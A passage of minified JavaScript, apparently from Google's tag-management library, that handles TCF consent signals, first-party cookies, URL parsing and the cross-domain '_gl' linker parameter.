      if (z.top == z) return 0;
      var a = z.location.ancestorOrigins;
      return a ? a[a.length - 1] == z.location.origin ? 1 : 2 : Gh(z.top) ? 1 : 2;
    },
    Jh = function (a, b) {
      b = void 0 === b ? document : b;
      return b.createElement(String(a).toLowerCase());
    };
  function Lh(a, b, c, d) {
    d = void 0 === d ? !1 : d;
    a.google_image_requests || (a.google_image_requests = []);
    var e = Jh("IMG", a.document);
    if (c) {
      var f = function () {
        if (c) {
          var h = a.google_image_requests,
            l = db(h, e);
          0 <= l && Array.prototype.splice.call(h, l, 1);
        }
        e.removeEventListener && e.removeEventListener("load", f, !1);
        e.removeEventListener && e.removeEventListener("error", f, !1);
      };
      wh(e, "load", f);
      wh(e, "error", f);
    }
    d && (e.attributionSrc = "");
    e.src = b;
    a.google_image_requests.push(e);
  }
  var Nh = function (a) {
      var b;
      b = void 0 === b ? !1 : b;
      var c = "https://pagead2.googlesyndication.com/pagead/gen_204?id=tcfe";
      Hh(a, function (d, e) {
        if (d || 0 === d) c += "&" + e + "=" + encodeURIComponent("" + d);
      });
      Mh(c, b);
    },
    Mh = function (a, b) {
      var c = window,
        d;
      b = void 0 === b ? !1 : b;
      d = void 0 === d ? !1 : d;
      if (c.fetch) {
        var e = {
          keepalive: !0,
          credentials: "include",
          redirect: "follow",
          method: "get",
          mode: "no-cors"
        };
        d && (e.mode = "cors", "setAttributionReporting" in XMLHttpRequest.prototype ? e.attributionReporting = {
          eventSourceEligible: "true",
          triggerEligible: "false"
        } : e.headers = {
          "Attribution-Reporting-Eligible": "event-source"
        });
        c.fetch(a, e);
      } else Lh(c, a, void 0 === b ? !1 : b, void 0 === d ? !1 : d);
    };
  var Oh = function () {};
  var Ph = function (a) {
      void 0 !== a.addtlConsent && "string" !== typeof a.addtlConsent && (a.addtlConsent = void 0);
      void 0 !== a.gdprApplies && "boolean" !== typeof a.gdprApplies && (a.gdprApplies = void 0);
      return void 0 !== a.tcString && "string" !== typeof a.tcString || void 0 !== a.listenerId && "number" !== typeof a.listenerId ? 2 : a.cmpStatus && "error" !== a.cmpStatus ? 0 : 3;
    },
    Qh = function (a, b) {
      b = void 0 === b ? {} : b;
      this.B = a;
      this.h = null;
      this.M = {};
      this.Db = 0;
      var c;
      this.U = null != (c = b.Ql) ? c : 500;
      var d;
      this.H = null != (d = b.sm) ? d : !1;
      this.C = null;
    };
  pa(Qh, Oh);
  var Sh = function (a) {
    return "function" === typeof a.B.__tcfapi || null != Rh(a);
  };
  Qh.prototype.addEventListener = function (a) {
    var b = this,
      c = {
        internalBlockOnErrors: this.H
      },
      d = vh(function () {
        return a(c);
      }),
      e = 0;
    -1 !== this.U && (e = setTimeout(function () {
      c.tcString = "tcunavailable";
      c.internalErrorState = 1;
      d();
    }, this.U));
    var f = function (h, l) {
      clearTimeout(e);
      h ? (c = h, c.internalErrorState = Ph(c), c.internalBlockOnErrors = b.H, l && 0 === c.internalErrorState || (c.tcString = "tcunavailable", l || (c.internalErrorState = 3))) : (c.tcString = "tcunavailable", c.internalErrorState = 3);
      a(c);
    };
    try {
      Th(this, "addEventListener", f);
    } catch (h) {
      c.tcString = "tcunavailable", c.internalErrorState = 3, e && (clearTimeout(e), e = 0), d();
    }
  };
  Qh.prototype.removeEventListener = function (a) {
    a && a.listenerId && Th(this, "removeEventListener", null, a.listenerId);
  };
  var Vh = function (a, b, c) {
      var d;
      d = void 0 === d ? "755" : d;
      var e;
      a: {
        if (a.publisher && a.publisher.restrictions) {
          var f = a.publisher.restrictions[b];
          if (void 0 !== f) {
            e = f[void 0 === d ? "755" : d];
            break a;
          }
        }
        e = void 0;
      }
      var h = e;
      if (0 === h) return !1;
      var l = c;
      2 === c ? (l = 0, 2 === h && (l = 1)) : 3 === c && (l = 1, 1 === h && (l = 0));
      var m;
      if (0 === l) {
        if (a.purpose && a.vendor) {
          var n = Uh(a.vendor.consents, void 0 === d ? "755" : d);
          m = n && "1" === b && a.purposeOneTreatment && "CH" === a.publisherCC ? !0 : n && Uh(a.purpose.consents, b);
        } else m = !0;
      } else m = 1 === l ? a.purpose && a.vendor ? Uh(a.purpose.legitimateInterests, b) && Uh(a.vendor.legitimateInterests, void 0 === d ? "755" : d) : !0 : !0;
      return m;
    },
    Uh = function (a, b) {
      return !(!a || !a[b]);
    },
    Th = function (a, b, c, d) {
      c || (c = function () {});
      if ("function" === typeof a.B.__tcfapi) {
        var e = a.B.__tcfapi;
        e(b, 2, c, d);
      } else if (Rh(a)) {
        Wh(a);
        var f = ++a.Db;
        a.M[f] = c;
        if (a.h) {
          var h = {};
          a.h.postMessage((h.__tcfapiCall = {
            command: b,
            version: 2,
            callId: f,
            parameter: d
          }, h), "*");
        }
      } else c({}, !1);
    },
    Rh = function (a) {
      if (a.h) return a.h;
      var b;
      a: {
        for (var c = a.B, d = 0; 50 > d; ++d) {
          var e;
          try {
            e = !(!c.frames || !c.frames.__tcfapiLocator);
          } catch (l) {
            e = !1;
          }
          if (e) {
            b = c;
            break a;
          }
          var f;
          b: {
            try {
              var h = c.parent;
              if (h && h != c) {
                f = h;
                break b;
              }
            } catch (l) {}
            f = null;
          }
          if (!(c = f)) break;
        }
        b = null;
      }
      a.h = b;
      return a.h;
    },
    Wh = function (a) {
      a.C || (a.C = function (b) {
        try {
          var c;
          c = ("string" === typeof b.data ? JSON.parse(b.data) : b.data).__tcfapiReturn;
          a.M[c.callId](c.returnValue, c.success);
        } catch (d) {}
      }, wh(a.B, "message", a.C));
    },
    Xh = function (a) {
      if (!1 === a.gdprApplies) return !0;
      void 0 === a.internalErrorState && (a.internalErrorState = Ph(a));
      return "error" === a.cmpStatus || 0 !== a.internalErrorState ? a.internalBlockOnErrors ? (Nh({
        e: String(a.internalErrorState)
      }), !1) : !0 : "loaded" !== a.cmpStatus || "tcloaded" !== a.eventStatus && "useractioncomplete" !== a.eventStatus ? !1 : !0;
    };
  var Yh = {
      1: 0,
      3: 0,
      4: 0,
      7: 3,
      9: 3,
      10: 3
    },
    Zh = th('', 500);
  function $h() {
    var a = Ae.tcf || {};
    return Ae.tcf = a;
  }
  var ei = function () {
    var a = $h(),
      b = new Qh(z, {
        Ql: -1
      });
    Sh(b) && ai() && J(124);
    if ((!ai() || P(90)) && !a.active && Sh(b)) {
      a.active = !0;
      ai() || (a.Bb = {}, a.cmpId = 0, a.tcfPolicyVersion = 0, bi(), a.tcString = "tcunavailable");
      try {
        b.addEventListener(function (c) {
          if (0 !== c.internalErrorState) ci(a), di(a);else {
            a.gdprApplies = c.gdprApplies;
            if (P(90)) {
              a.cmpId = c.cmpId;
              a.enableAdvertiserConsentMode = c.enableAdvertiserConsentMode;
              if (ai()) return;
              a.tcfPolicyVersion = c.tcfPolicyVersion;
            }
            var d;
            if (!1 === c.gdprApplies) {
              var e = {},
                f;
              for (f in Yh) Yh.hasOwnProperty(f) && (e[f] = !0);
              d = e;
              b.removeEventListener(c);
            } else if ("tcloaded" === c.eventStatus || "useractioncomplete" === c.eventStatus || "cmpuishown" === c.eventStatus) {
              var h = {},
                l;
              for (l in Yh) if (Yh.hasOwnProperty(l)) if ("1" === l) {
                var m,
                  n = c,
                  p = !0;
                p = void 0 === p ? !1 : p;
                m = Xh(n) ? !1 === n.gdprApplies || "tcunavailable" === n.tcString || void 0 === n.gdprApplies && !p || "string" !== typeof n.tcString || !n.tcString.length ? !0 : Vh(n, "1", 0) : !1;
                h["1"] = m;
              } else h[l] = Vh(c, l, Yh[l]);
              d = h;
            }
            d && (a.tcString = c.tcString || "tcempty", a.Bb = d, di(a));
          }
        });
      } catch (c) {
        ci(a), di(a);
      }
    }
  };
  function ci(a) {
    a.type = "e";
    a.tcString = "tcunavailable";
  }
  function bi() {
    var a = {},
      b = (a[K.g.F] = "denied", a[K.g.Ye] = Zh, a);
    P(90) && (b[K.g.fb] = "denied");
    Yf(b);
  }
  var ai = function () {
    var a = !0 === z.gtag_enable_tcf_support;
    if (P(90)) {
      var b = $h().enableAdvertiserConsentMode;
      return !a && !b;
    }
    return !a;
  };
  function di(a) {
    var b = {},
      c = (b[K.g.F] = a.Bb["1"] ? "granted" : "denied", b);
    P(90) && (c[K.g.fb] = a.Bb["3"] && a.Bb["4"] ? "granted" : "denied", "number" === typeof a.tcfPolicyVersion && 4 <= a.tcfPolicyVersion && (c[K.g.K] = a.Bb["1"] && a.Bb["7"] ? "granted" : "denied"));
    Zf(c, {
      eventId: 0
    }, {
      gdprApplies: a ? a.gdprApplies : void 0,
      tcString: fi()
    });
  }
  var fi = function () {
      var a = $h();
      return a.active ? a.tcString || "" : "";
    },
    gi = function () {
      var a = $h();
      return a.active && void 0 !== a.gdprApplies ? a.gdprApplies ? "1" : "0" : "";
    },
    hi = function (a) {
      if (!Yh.hasOwnProperty(String(a))) return !0;
      var b = $h();
      return b.active && b.Bb ? !!b.Bb[String(a)] : !0;
    };
  var ii = [K.g.F, K.g.N],
    ji = [K.g.F, K.g.N, K.g.K, K.g.fb],
    ki = {},
    li = (ki[K.g.F] = 1, ki[K.g.N] = 2, ki);
  function mi(a) {
    switch (T(a, K.g.Z)) {
      case void 0:
        return 1;
      case !1:
        return 3;
      default:
        return 2;
    }
  }
  var ni = function (a) {
      var b = 3 !== mi(a);
      P(70) && (b = b && Mf(K.g.fb));
      return b;
    },
    oi = function () {
      var a = {},
        b;
      for (b in li) if (li.hasOwnProperty(b)) {
        var c = li[b],
          d,
          e = Gf();
        e.accessedAny = !0;
        d = Lf(e, b);
        a[c] = d;
      }
      var f = P(53) && ii.every(Mf),
        h = P(48);
      return f || h ? mc(a, 1) : mc(a, 0);
    },
    pi = {},
    qi = (pi[K.g.F] = 0, pi[K.g.N] = 1, pi[K.g.K] = 2, pi[K.g.fb] = 3, pi);
  function ri(a) {
    switch (a) {
      case void 0:
        return 1;
      case !0:
        return 3;
      case !1:
        return 2;
      default:
        return 0;
    }
  }
  var si = function (a) {
      if (P(50)) {
        for (var b = "1", c = 0; c < ji.length; c++) {
          var d = b,
            e,
            f = ji[c],
            h = Ef[f];
          e = void 0 === h ? 0 : qi.hasOwnProperty(h) ? 12 | qi[h] : 8;
          var l = Gf();
          l.accessedAny = !0;
          var m = l.entries[f] || {};
          e = e << 2 | ri(m.implicit);
          b = d + ("" + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[e] + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[ri(m.declare) << 4 | ri(m.default) << 2 | ri(m.update)]);
        }
        void 0 !== a && (b += mi(a));
        return b;
      }
      for (var n = "G1", p = 0; p < ii.length; p++) {
        var q;
        a: {
          var r = ii[p],
            t = Gf();
          t.accessedDefault = !0;
          switch ((t.entries[r] || {}).default) {
            case !0:
              q = 3;
              break a;
            case !1:
              q = 2;
              break a;
            default:
              q = 1;
          }
        }
        switch (q) {
          case 3:
            n += "1";
            break;
          case 2:
            n += "0";
            break;
          case 1:
            n += "-";
        }
      }
      return n;
    },
    ti = function () {
      if (!Mf(K.g.K)) return "-";
      var a = [],
        b = Gf().cps,
        c;
      for (c in b) b.hasOwnProperty(c) && b[c].enabled && a.push(c);
      for (var d = "", e = 0; e < a.length; e++) {
        var f = ye[a[e]];
        f && (d += f);
      }
      return "" === d ? "-" : d;
    };
  function ui() {
    var a = !!pf["6"],
      b = !1;
    P(90) && (b = !ai() && "1" === gi());
    return a || b;
  }
  var vi = function () {
      return ui() ? "1" : "0";
    },
    wi = function () {
      return ui() || Gf().usedSetCps || !Q(K.g.K);
    };
  var xi = function (a) {
    var b = 1,
      c,
      d,
      e;
    if (a) for (b = 0, d = a.length - 1; 0 <= d; d--) e = a.charCodeAt(d), b = (b << 6 & 268435455) + e + (e << 14), c = b & 266338304, b = 0 !== c ? b ^ c >> 21 : b;
    return b;
  };
  var yi = function (a, b, c) {
    for (var d = [], e = b.split(";"), f = 0; f < e.length; f++) {
      var h = e[f].split("="),
        l = h[0].replace(/^\s*|\s*$/g, "");
      if (l && l == a) {
        var m = h.slice(1).join("=").replace(/^\s*|\s*$/g, "");
        m && c && (m = decodeURIComponent(m));
        d.push(m);
      }
    }
    return d;
  };
  function zi(a) {
    return "null" !== a.origin;
  }
  ;
  var Ci = function (a, b, c, d) {
      return Ai(d) ? yi(a, String(b || Bi()), c) : [];
    },
    Fi = function (a, b, c, d, e) {
      if (Ai(e)) {
        var f = Di(a, d, e);
        if (1 === f.length) return f[0].id;
        if (0 !== f.length) {
          f = Ei(f, function (h) {
            return h.Ce;
          }, b);
          if (1 === f.length) return f[0].id;
          f = Ei(f, function (h) {
            return h.Jd;
          }, c);
          return f[0] ? f[0].id : void 0;
        }
      }
    };
  function Gi(a, b, c, d) {
    var e = Bi(),
      f = window;
    zi(f) && (f.document.cookie = a);
    var h = Bi();
    return e != h || void 0 != c && 0 <= Ci(b, h, !1, d).indexOf(c);
  }
  var Ki = function (a, b, c) {
      function d(t, u, v) {
        if (null == v) return delete h[u], t;
        h[u] = v;
        return t + "; " + u + "=" + v;
      }
      function e(t, u) {
        if (null == u) return delete h[u], t;
        h[u] = !0;
        return t + "; " + u;
      }
      if (!Ai(c.eb)) return 2;
      var f;
      void 0 == b ? f = a + "=deleted; expires=" + new Date(0).toUTCString() : (c.encode && (b = encodeURIComponent(b)), b = Hi(b), f = a + "=" + b);
      var h = {};
      f = d(f, "path", c.path);
      var l;
      c.expires instanceof Date ? l = c.expires.toUTCString() : null != c.expires && (l = "" + c.expires);
      f = d(f, "expires", l);
      f = d(f, "max-age", c.ym);
      f = d(f, "samesite", c.zm);
      c.Am && (f = e(f, "secure"));
      var m = c.domain;
      if (m && "auto" === m.toLowerCase()) {
        for (var n = Ii(), p = 0; p < n.length; ++p) {
          var q = "none" !== n[p] ? n[p] : void 0,
            r = d(f, "domain", q);
          r = e(r, c.flags);
          if (!Ji(q, c.path) && Gi(r, a, b, c.eb)) return 0;
        }
        return 1;
      }
      m && "none" !== m.toLowerCase() && (f = d(f, "domain", m));
      f = e(f, c.flags);
      return Ji(m, c.path) ? 1 : Gi(f, a, b, c.eb) ? 0 : 1;
    },
    Li = function (a, b, c) {
      null == c.path && (c.path = "/");
      c.domain || (c.domain = "auto");
      return Ki(a, b, c);
    };
  function Ei(a, b, c) {
    for (var d = [], e = [], f, h = 0; h < a.length; h++) {
      var l = a[h],
        m = b(l);
      m === c ? d.push(l) : void 0 === f || m < f ? (e = [l], f = m) : m === f && e.push(l);
    }
    return 0 < d.length ? d : e;
  }
  function Di(a, b, c) {
    for (var d = [], e = Ci(a, void 0, void 0, c), f = 0; f < e.length; f++) {
      var h = e[f].split("."),
        l = h.shift();
      if (!b || -1 !== b.indexOf(l)) {
        var m = h.shift();
        m && (m = m.split("-"), d.push({
          id: h.join("."),
          Ce: 1 * m[0] || 1,
          Jd: 1 * m[1] || 1
        }));
      }
    }
    return d;
  }
  var Hi = function (a) {
      a && 1200 < a.length && (a = a.substring(0, 1200));
      return a;
    },
    Mi = /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/,
    Ni = /(^|\.)doubleclick\.net$/i,
    Ji = function (a, b) {
      return Ni.test(window.document.location.hostname) || "/" === b && Mi.test(a);
    },
    Bi = function () {
      return zi(window) ? window.document.cookie : "";
    },
    Ii = function () {
      var a = [],
        b = window.document.location.hostname.split(".");
      if (4 === b.length) {
        var c = b[b.length - 1];
        if (parseInt(c, 10).toString() === c) return ["none"];
      }
      for (var d = b.length - 2; 0 <= d; d--) a.push(b.slice(d).join("."));
      var e = window.document.location.hostname;
      Ni.test(e) || Mi.test(e) || a.push("none");
      return a;
    },
    Ai = function (a) {
      return Bf().h() && a && Of() ? Nf(a) ? Mf(a) : !1 : !0;
    };
  var Oi = function (a) {
      var b = Math.round(2147483647 * Math.random());
      return a ? String(b ^ xi(a) & 2147483647) : String(b);
    },
    Pi = function (a) {
      return [Oi(a), Math.round(Ja() / 1E3)].join(".");
    },
    Si = function (a, b, c, d, e) {
      var f = Qi(b);
      return Fi(a, f, Ri(c), d, e);
    },
    Ti = function (a, b, c, d) {
      var e = "" + Qi(c),
        f = Ri(d);
      1 < f && (e += "-" + f);
      return [b, e, a].join(".");
    },
    Qi = function (a) {
      if (!a) return 1;
      a = 0 === a.indexOf(".") ? a.substr(1) : a;
      return a.split(".").length;
    },
    Ri = function (a) {
      if (!a || "/" === a) return 1;
      "/" !== a[0] && (a = "/" + a);
      "/" !== a[a.length - 1] && (a += "/");
      return a.split("/").length - 1;
    };
  var Ui = function () {
    Ae.dedupe_gclid || (Ae.dedupe_gclid = "" + Pi());
    return Ae.dedupe_gclid;
  };
  var Vi = function () {
    var a = !1;
    return a;
  };
  var Wi = {
      UA: 1,
      AW: 2,
      DC: 3,
      G: 4,
      GF: 5,
      GT: 12,
      GTM: 14,
      HA: 6,
      MC: 7
    },
    Xi = function (a) {
      var b = jg.ctid.split("-")[0].toUpperCase(),
        c = {};
      c.ctid = jg.ctid;
      c.Gl = ze.md;
      c.Jl = ze.Gf;
      c.jl = hg.te ? 2 : 1;
      Ge ? (c.Re = Wi[b], c.Re || (c.Re = 0)) : c.Re = Me ? 13 : 10;
      Ke ? c.fg = 1 : Vi() ? c.fg = 2 : c.fg = 3;
      var d;
      var e = c.Re,
        f = c.fg;
      void 0 === e ? d = "" : (f || (f = 0), d = "" + Gd(1, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[e << 2 | f]);
      var h = c.qm,
        l = 4 + d + (h ? "" + Gd(2, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[h] : ""),
        m,
        n = c.Jl;
      m = n && Fd.test(n) ? "" + Gd(3, 2) + n : "";
      var p,
        q = c.Gl;
      p = q ? "" + Gd(4, 1) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[q] : "";
      var r;
      var t = c.ctid;
      if (t && a) {
        var u = t.split("-"),
          v = u[0].toUpperCase();
        if ("GTM" !== v && "OPT" !== v) r = "";else {
          var w = u[1];
          r = "" + Gd(5, 3) + "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_"[1 + w.length] + (c.jl || 0) + w;
        }
      } else r = "";
      return l + m + p + r;
    };
  var Yi = void 0;
  function Zi(a) {
    var b = "";
    return b;
  }
  ;
  wb();
  yh() || tb("iPod");
  tb("iPad");
  !tb("Android") || xb() || wb() || vb() || tb("Silk");
  xb();
  !tb("Safari") || xb() || (ub() ? 0 : tb("Coast")) || vb() || (ub() ? 0 : tb("Edge")) || (ub() ? sb("Microsoft Edge") : tb("Edg/")) || (ub() ? sb("Opera") : tb("OPR")) || wb() || tb("Silk") || tb("Android") || zh();
  var $i = {},
    aj = null,
    bj = function (a) {
      for (var b = [], c = 0, d = 0; d < a.length; d++) {
        var e = a.charCodeAt(d);
        255 < e && (b[c++] = e & 255, e >>= 8);
        b[c++] = e;
      }
      var f = 4;
      void 0 === f && (f = 0);
      if (!aj) {
        aj = {};
        for (var h = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""), l = ["+/=", "+/", "-_=", "-_.", "-_"], m = 0; 5 > m; m++) {
          var n = h.concat(l[m].split(""));
          $i[m] = n;
          for (var p = 0; p < n.length; p++) {
            var q = n[p];
            void 0 === aj[q] && (aj[q] = p);
          }
        }
      }
      for (var r = $i[f], t = Array(Math.floor(b.length / 3)), u = r[64] || "", v = 0, w = 0; v < b.length - 2; v += 3) {
        var x = b[v],
          y = b[v + 1],
          A = b[v + 2],
          B = r[x >> 2],
          C = r[(x & 3) << 4 | y >> 4],
          I = r[(y & 15) << 2 | A >> 6],
          E = r[A & 63];
        t[w++] = "" + B + C + I + E;
      }
      var F = 0,
        L = u;
      switch (b.length - v) {
        case 2:
          F = b[v + 1], L = r[(F & 15) << 2] || u;
        case 1:
          var M = b[v];
          t[w] = "" + r[M >> 2] + r[(M & 3) << 4 | F >> 4] + L + u;
      }
      return t.join("");
    };
  var cj = "platform platformVersion architecture model uaFullVersion bitness fullVersionList wow64".split(" ");
  function dj() {
    var a;
    return null != (a = z.google_tag_data) ? a : z.google_tag_data = {};
  }
  function ej() {
    var a = z.google_tag_data,
      b;
    if (null != a && a.uach) {
      var c = a.uach,
        d = Object.assign({}, c);
      c.fullVersionList && (d.fullVersionList = c.fullVersionList.slice(0));
      b = d;
    } else b = null;
    return b;
  }
  function fj() {
    var a, b;
    return null != (b = null == (a = z.google_tag_data) ? void 0 : a.uach_promise) ? b : null;
  }
  function gj() {
    var a, b;
    return "function" === typeof (null == (a = z.navigator) ? void 0 : null == (b = a.userAgentData) ? void 0 : b.getHighEntropyValues);
  }
  function hj() {
    if (!gj()) return null;
    var a = dj();
    if (a.uach_promise) return a.uach_promise;
    var b = z.navigator.userAgentData.getHighEntropyValues(cj).then(function (c) {
      null != a.uach || (a.uach = c);
      return c;
    });
    return a.uach_promise = b;
  }
  ;
  var nj = /:[0-9]+$/,
    oj = /^\d+\.fls\.doubleclick\.net$/,
    pj = function (a, b, c) {
      for (var d = a.split("&"), e = 0; e < d.length; e++) {
        var f = d[e].split("=");
        if (decodeURIComponent(f[0]).replace(/\+/g, " ") === b) {
          var h = f.slice(1).join("=");
          return c ? h : decodeURIComponent(h).replace(/\+/g, " ");
        }
      }
    },
    sj = function (a, b, c, d, e) {
      b && (b = String(b).toLowerCase());
      if ("protocol" === b || "port" === b) a.protocol = qj(a.protocol) || qj(z.location.protocol);
      "port" === b ? a.port = String(Number(a.hostname ? a.port : z.location.port) || ("http" === a.protocol ? 80 : "https" === a.protocol ? 443 : "")) : "host" === b && (a.hostname = (a.hostname || z.location.hostname).replace(nj, "").toLowerCase());
      return rj(a, b, c, d, e);
    },
    rj = function (a, b, c, d, e) {
      var f,
        h = qj(a.protocol);
      b && (b = String(b).toLowerCase());
      switch (b) {
        case "url_no_fragment":
          f = tj(a);
          break;
        case "protocol":
          f = h;
          break;
        case "host":
          f = a.hostname.replace(nj, "").toLowerCase();
          if (c) {
            var l = /^www\d*\./.exec(f);
            l && l[0] && (f = f.substr(l[0].length));
          }
          break;
        case "port":
          f = String(Number(a.port) || ("http" === h ? 80 : "https" === h ? 443 : ""));
          break;
        case "path":
          a.pathname || a.hostname || ab("TAGGING", 1);
          f = "/" === a.pathname.substr(0, 1) ? a.pathname : "/" + a.pathname;
          var m = f.split("/");
          0 <= (d || []).indexOf(m[m.length - 1]) && (m[m.length - 1] = "");
          f = m.join("/");
          break;
        case "query":
          f = a.search.replace("?", "");
          e && (f = pj(f, e));
          break;
        case "extension":
          var n = a.pathname.split(".");
          f = 1 < n.length ? n[n.length - 1] : "";
          f = f.split("/")[0];
          break;
        case "fragment":
          f = a.hash.replace("#", "");
          break;
        default:
          f = a && a.href;
      }
      return f;
    },
    qj = function (a) {
      return a ? a.replace(":", "").toLowerCase() : "";
    },
    tj = function (a) {
      var b = "";
      if (a && a.href) {
        var c = a.href.indexOf("#");
        b = 0 > c ? a.href : a.href.substr(0, c);
      }
      return b;
    },
    uj = function (a) {
      var b = D.createElement("a");
      a && (b.href = a);
      var c = b.pathname;
      "/" !== c[0] && (a || ab("TAGGING", 1), c = "/" + c);
      var d = b.hostname.replace(nj, "");
      return {
        href: b.href,
        protocol: b.protocol,
        host: b.host,
        hostname: d,
        pathname: c,
        search: b.search,
        hash: b.hash,
        port: b.port
      };
    },
    vj = function (a) {
      function b(n) {
        var p = n.split("=")[0];
        return 0 > d.indexOf(p) ? n : p + "=0";
      }
      function c(n) {
        return n.split("&").map(b).filter(function (p) {
          return void 0 !== p;
        }).join("&");
      }
      var d = "gclid dclid gbraid wbraid gclaw gcldc gclha gclgf gclgb _gl".split(" "),
        e = uj(a),
        f = a.split(/[?#]/)[0],
        h = e.search,
        l = e.hash;
      "?" === h[0] && (h = h.substring(1));
      "#" === l[0] && (l = l.substring(1));
      h = c(h);
      l = c(l);
      "" !== h && (h = "?" + h);
      "" !== l && (l = "#" + l);
      var m = "" + f + h + l;
      "/" === m[m.length - 1] && (m = m.substring(0, m.length - 1));
      return m;
    },
    wj = function (a) {
      var b = uj(z.location.href),
        c = sj(b, "host", !1);
      if (c && c.match(oj)) {
        var d = sj(b, "path").split(a + "=");
        if (1 < d.length) return d[1].split(";")[0].split("?")[0];
      }
    };
  function xj(a, b, c, d) {
    var e,
      f = Number(null != a.yb ? a.yb : void 0);
    0 !== f && (e = new Date((b || Ja()) + 1E3 * (f || 7776E3)));
    return {
      path: a.path,
      domain: a.domain,
      flags: a.flags,
      encode: !!c,
      expires: e,
      eb: d
    };
  }
  ;
  var yj;
  var Cj = function () {
      var a = zj,
        b = Aj,
        c = Bj(),
        d = function (h) {
          a(h.target || h.srcElement || {});
        },
        e = function (h) {
          b(h.target || h.srcElement || {});
        };
      if (!c.init) {
        Ub(D, "mousedown", d);
        Ub(D, "keyup", d);
        Ub(D, "submit", e);
        var f = HTMLFormElement.prototype.submit;
        HTMLFormElement.prototype.submit = function () {
          b(this);
          f.call(this);
        };
        c.init = !0;
      }
    },
    Dj = function (a, b, c, d, e) {
      var f = {
        callback: a,
        domains: b,
        fragment: 2 === c,
        placement: c,
        forms: d,
        sameHost: e
      };
      Bj().decorators.push(f);
    },
    Ej = function (a, b, c) {
      for (var d = Bj().decorators, e = {}, f = 0; f < d.length; ++f) {
        var h = d[f],
          l;
        if (l = !c || h.forms) a: {
          var m = h.domains,
            n = a,
            p = !!h.sameHost;
          if (m && (p || n !== D.location.hostname)) for (var q = 0; q < m.length; q++) if (m[q] instanceof RegExp) {
            if (m[q].test(n)) {
              l = !0;
              break a;
            }
          } else if (0 <= n.indexOf(m[q]) || p && 0 <= m[q].indexOf(n)) {
            l = !0;
            break a;
          }
          l = !1;
        }
        if (l) {
          var r = h.placement;
          void 0 == r && (r = h.fragment ? 2 : 1);
          r === b && Ma(e, h.callback());
        }
      }
      return e;
    };
  function Bj() {
    var a = Lb("google_tag_data", {}),
      b = a.gl;
    b && b.decorators || (b = {
      decorators: []
    }, a.gl = b);
    return b;
  }
  ;
  var Fj = /(.*?)\*(.*?)\*(.*)/,
    Gj = /^https?:\/\/([^\/]*?)\.?cdn\.ampproject\.org\/?(.*)/,
    Hj = /^(?:www\.|m\.|amp\.)+/,
    Ij = /([^?#]+)(\?[^#]*)?(#.*)?/;
  function Jj(a) {
    return new RegExp("(.*?)(^|&)" + a + "=([^&]*)&?(.*)");
  }
  var Lj = function (a) {
    var b = [],
      c;
    for (c in a) if (a.hasOwnProperty(c)) {
      var d = a[c];
      void 0 !== d && d === d && null !== d && "[object Object]" !== d.toString() && (b.push(c), b.push(Ya(String(d))));
    }
    var e = b.join("*");
    return ["1", Kj(e), e].join("*");
  };
  function Kj(a, b) {
    var c = [Jb.userAgent, new Date().getTimezoneOffset(), Jb.userLanguage || Jb.language, Math.floor(Ja() / 60 / 1E3) - (void 0 === b ? 0 : b), a].join("*"),
      d;
    if (!(d = yj)) {
      for (var e = Array(256), f = 0; 256 > f; f++) {
        for (var h = f, l = 0; 8 > l; l++) h = h & 1 ? h >>> 1 ^ 3988292384 : h >>> 1;
        e[f] = h;
      }
      d = e;
    }
    yj = d;
    for (var m = 4294967295, n = 0; n < c.length; n++) m = m >>> 8 ^ yj[(m ^ c.charCodeAt(n)) & 255];
    return ((m ^ -1) >>> 0).toString(36);
  }
  function Mj() {
    return function (a) {
      var b = uj(z.location.href),
        c = b.search.replace("?", ""),
        d = pj(c, "_gl", !0) || "";
      a.query = Nj(d) || {};
      var e = sj(b, "fragment").match(Jj("_gl"));
      a.fragment = Nj(e && e[3] || "") || {};
    };
  }
  function Oj(a, b) {
    var c = Jj(a).exec(b),
      d = b;
    if (c) {
      var e = c[2],
        f = c[4];
      d = c[1];
      f && (d = d + e + f);
    }
    return d;
  }
  var Pj = function (a, b) {
      b || (b = "_gl");
      var c = Ij.exec(a);
      if (!c) return "";
      var d = c[1],
        e = Oj(b, (c[2] || "").slice(1)),
        f = Oj(b, (c[3] || "").slice(1));
      e.length && (e = "?" + e);
      f.length && (f = "#" + f);
      return "" + d + e + f;
    },
    Qj = function (a) {
      var b = Mj(),
        c = Bj();
      c.data || (c.data = {
        query: {},
        fragment: {}
      }, b(c.data));
      var d = {},
        e = c.data;
      e && (Ma(d, e.query), a && Ma(d, e.fragment));
      return d;
    },
    Nj = function (a) {
      try {
        var b = Rj(a, 3);
        if (void 0 !== b) {
          for (var c = {}, d = b ? b.split("*") : [], e = 0; e + 1 < d.length; e += 2) {
            var f = d[e],
              h = Za(d[e + 1]);
            c[f] = h;
          }
          ab("TAGGING", 6);
          return c;
        }
      } catch (l) {
        ab("TAGGING", 8);
      }
    };
  function Rj(a, b) {
    if (a) {
      var c;
      a: {
        for (var d = a, e = 0; 3 > e; ++e) {
          var f = Fj.exec(d);
          if (f) {
            c = f;
            break a;
          }
          d = decodeURIComponent(d);
        }
        c = void 0;
      }
      var h = c;
      if (h && "1" === h[1]) {
        var l = h[3],
          m;
        a: {
          for (var n = h[2], p = 0; p < b; ++p) if (n === Kj(l, p)) {
            m = !0;
            break a;
          }
          m = !1;
        }
        if (m) return l;
        ab("TAGGING", 7);
      }
    }
  }
  function Sj(a, b, c, d) {
    function e(p) {
      p = Oj(a, p);
      var q = p.charAt(p.length - 1);
      p && "&" !== q && (p += "&");
      return p + n;
    }
    d = void 0 === d ? !1 : d;
    var f = Ij.exec(c);
    if (!f) return "";
    var h = f[1],
      l = f[2] || "",
      m = f[3] || "",
      n = a + "=" + b;
    d ? m = "#" + e(m.substring(1)) : l = "?" + e(l.substring(1));
    return "" + h + l + m;
  }
